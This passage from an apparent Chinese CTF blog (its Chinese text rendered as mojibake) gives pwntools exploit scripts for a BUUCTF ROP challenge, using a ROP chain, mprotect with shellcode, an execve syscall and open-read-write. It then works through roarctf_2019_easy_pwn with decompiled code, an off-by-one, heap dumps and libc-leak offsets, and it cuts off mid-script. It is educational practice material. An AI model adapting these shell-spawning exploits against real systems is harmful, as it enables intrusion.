class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•äºŒï¼šmprotect"><a href="#è§£æ³•äºŒï¼šmprotect" class="headerlink" title="è§£æ³•äºŒï¼šmprotect"></a>è§£æ³•äºŒï¼šmprotect</h2><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./rop&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25843</span>)</span><br><span class="line">pop_3_ret = <span class="number">0x080483c8</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*(<span class="number">0xc</span>+<span class="number">4</span>) </span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;mprotect&#x27;</span>]) </span><br><span class="line">payload += p32(pop_3_ret)</span><br><span class="line">payload += p32(elf.bss() &amp; <span class="number">0xffff000</span>)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)</span><br><span class="line">payload += p32(<span class="number">7</span>)</span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p32(elf.bss())</span><br><span class="line">payload += p32(elf.bss())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(asm(shellcraft.sh()))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•ä¸‰ï¼šsyscall"><a href="#è§£æ³•ä¸‰ï¼šsyscall" class="headerlink" title="è§£æ³•ä¸‰ï¼šsyscall"></a>è§£æ³•ä¸‰ï¼šsyscall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./rop&#x27;</span>) </span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,26508)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">offset = <span class="number">0xc</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x80de769</span></span><br><span class="line">pop_ebx_pop_edx_ret = <span class="number">0x806ecd9</span></span><br><span class="line">pop_esi_pop_ebx_pop_edx_ret = <span class="number">0x806ecd8</span></span><br><span class="line">pop_eax_ret = <span class="number">0x80b8016</span></span><br><span class="line">syscall = <span class="number">0x80627cd</span></span><br><span class="line">int_0x80 = <span class="number">0x806c943</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) </span><br><span class="line">payload += p32(e.sym[<span class="string">&#x27;gets&#x27;</span>]) </span><br><span class="line">payload += p32(pop_eax_ret) </span><br><span class="line">payload += p32(e.bss()) </span><br><span class="line">payload += p32(pop_eax_ret) </span><br><span class="line">payload += p32(<span class="number">11</span>) </span><br><span class="line">payload += p32(pop_ebx_pop_edx_ret) </span><br><span class="line">payload += p32(e.bss()) </span><br><span class="line">payload += p32(<span class="number">0</span>) </span><br><span class="line">payload += p32(pop_ecx_ret) </span><br><span class="line">payload += p32(<span class="number">0</span>) </span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•å››ï¼šorw"><a href="#è§£æ³•å››ï¼šorw" class="headerlink" title="è§£æ³•å››ï¼šorw"></a>è§£æ³•å››ï¼šorw</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./rop&#x27;</span>) </span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,26508)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">pop_edx_ret = <span class="number">0x806ecda</span></span><br><span class="line">pop_ebx_pop_edx_ret = <span class="number">0x806ecd9</span></span><br><span class="line">pop_esi_pop_ebx_pop_edx_ret = <span class="number">0x806ecd8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p32(pop_edx_ret)</span><br><span class="line">payload += p32(elf.bss())</span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p32(pop_ebx_pop_edx_ret)</span><br><span class="line">payload += p32(elf.bss())</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;read&#x27;</span>]) </span><br><span class="line">payload += p32(pop_esi_pop_ebx_pop_edx_ret) </span><br><span class="line">payload += p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(elf.bss()) </span><br><span class="line">payload += p32(<span class="number">0x100</span>) </span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;write&#x27;</span>]) </span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) </span><br><span class="line">payload += p32(<span class="number">1</span>) </span><br><span class="line">payload += p32(elf.bss()) </span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x32-roarctf-2019-easy-pwn"><a href="#0x32-roarctf-2019-easy-pwn" class="headerlink" title="0x32.roarctf_2019_easy_pwn"></a>0x32.roarctf_2019_easy_pwn</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec roarctf_2019_easy_pwn </span><br><span class="line">[*] &#x27;/home/gwt/Desktop/roarctf_2019_easy_pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ä¿æŠ¤å…¨å¼€</p><p>åˆ†ä¸ºcreateï¼Œwriteï¼Œdropå’Œshow</p><p>create:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_C46</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *malloc_addr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( index = <span class="number">0</span>; index &lt;= <span class="number">15</span>; ++index )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(&amp;unk_202040 + <span class="number">4</span> * index);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      size = INPUT(v2);</span><br><span class="line">      <span class="keyword">if</span> ( size &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">4096</span> )</span><br><span class="line">          size = <span class="number">4096</span>;</span><br><span class="line">        malloc_addr = <span class="built_in">calloc</span>(size, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !malloc_addr )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(&amp;unk_202040 + <span class="number">4</span> * index) = <span class="number">1</span>;         <span class="comment">// ç½®1è¡¨ç¤ºå·²ä½¿ç”¨</span></span><br><span class="line">        *(&amp;unk_202044 + <span class="number">4</span> * index) = size;      <span class="comment">// å†™å…¥å¤§å°</span></span><br><span class="line">        qword_202048[<span class="number">2</span> * index] = malloc_addr;  <span class="comment">// å†™å…¥mallocçš„åœ°å€</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;the index of ticket is %d \n&quot;</span>, index);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>write:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_E82</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v2 = INPUT(v1);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(&amp;unk_202040 + <span class="number">4</span> * v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      v2 = INPUT(<span class="number">1</span>);</span><br><span class="line">      v4 = sub_E26(*(&amp;unk_202044 + <span class="number">4</span> * v3), v2);</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">        v2 = sub_D92(qword_202048[<span class="number">2</span> * v3], v4);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_E26</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰off-by-oneï¼Œå½“è¾“å…¥çš„sizeä¸åŸæ¥çš„ç›¸å·®æ˜¯10çš„æ—¶å€™ï¼Œä¼šåŠ 1ã€‚</p><p>deleteï¼šæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_F8E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v0 = INPUT(v3);</span><br><span class="line">  v4 = v0;</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0LL</span> &amp;&amp; v0 &lt;= <span class="number">15LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(&amp;unk_202040 + <span class="number">4</span> * v0);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;unk_202040 + <span class="number">4</span> * v0) = <span class="number">0</span>;</span><br><span class="line">      *(&amp;unk_202044 + <span class="number">4</span> * v0) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(qword_202048[<span class="number">2</span> * v0]);</span><br><span class="line">      qword_202048[<span class="number">2</span> * v2] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆcallocå‡ ä¸ªchunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x58</span>) <span class="comment">#0,,è¿™é‡Œcalloc 0x58æ–¹ä¾¿åé¢çš„å†™å…¥</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#4</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/60gx 0x555555757000</span></span><br><span class="line">0x555555757000:0x00000000000000000x0000000000000061</span><br><span class="line">0x555555757010:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757020:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757030:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757040:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757050:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757060:0x00000000000000000x0000000000000071</span><br><span class="line">0x555555757070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570d0:0x00000000000000000x0000000000000071</span><br><span class="line">0x5555557570e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757100:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757110:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757120:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757130:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757140:0x00000000000000000x0000000000000071</span><br><span class="line">0x555555757150:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757160:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757170:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757180:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757190:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571b0:0x00000000000000000x0000000000000071</span><br><span class="line">0x5555557571c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>ä¹‹åï¼š</p><p><code>write(0, 0x58 + 0xa, &#39;a&#39;* 0x58 + &#39;\xe1&#39;)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/60gx 0x555555757000</span></span><br><span class="line">0x555555757000:0x00000000000000000x0000000000000061</span><br><span class="line">0x555555757010:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555757020:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555757030:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555757040:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555757050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555757060:0x61616161616161610x00000000000000e1 &lt;=æ³¨æ„è¿™é‡Œ</span><br><span class="line">0x555555757070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757080:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570d0:0x00000000000000000x0000000000000071</span><br><span class="line">0x5555557570e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557570f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757100:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757110:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757120:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757130:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757140:0x00000000000000000x0000000000000071</span><br><span class="line">0x555555757150:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757160:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757170:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757180:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757190:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571b0:0x00000000000000000x0000000000000071</span><br><span class="line">0x5555557571c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5555557571d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>ç„¶ådropæ‰idx1ï¼Œè¿™æ ·çš„è¯idx1å’Œ2éƒ½ä¼šè¿›å…¥binä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">drop(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>) <span class="comment">#2 is unsortbin</span></span><br><span class="line"><span class="comment">#è¿™æ ·ä¼šæŠŠfdå’ŒbkæŒ‡é’ˆæ‰“å‡ºæ¥</span></span><br><span class="line"></span><br><span class="line">libc_base = address -  <span class="number">0x3c4b20</span> - <span class="number">0x58</span></span><br><span class="line">main_arean = address - <span class="number">0x58</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line">fake_chunk = main_arean - <span class="number">0x33</span></span><br></pre></td></tr></table></figure><p>showçš„åœ°å€æ˜¯ unsorted bin é“¾è¡¨çš„å¤´éƒ¨ï¼Œè·Ÿ main_arena çš„åç§»å›ºå®š 0x58ï¼ŒåŒæ—¶ main_arena è·Ÿ libc çš„åç§»å¯ä»¥é€šè¿‡å·¥å…·è®¡ç®—å‡ºæ¥ <a href="https://github.com/bash-c/main_arena_offset">https://github.com/bash-c/main_arena_offset</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/main_arena_offset$ ./main_arena ../Desktop/libc-2.23.so </span><br><span class="line">[+]libc version : glibc 2.23</span><br><span class="line">[+]build ID : BuildID[sha1]=9a6b57c7a4f93d7e54e61bccb7df996c8bc58141</span><br><span class="line">[+]main_arena_offset : 0x1b0780</span><br><span class="line">gwt@ubuntu:~/main_arena_offset$ ./main_arena /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">[+]libc version : glibc 2.23</span><br><span class="line">[+]build ID : BuildID[sha1]=30773be8cf5bfed9d910c8473dd44eaab2e705ab</span><br><span class="line">[+]main_arena_offset : 0x3c4b20</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 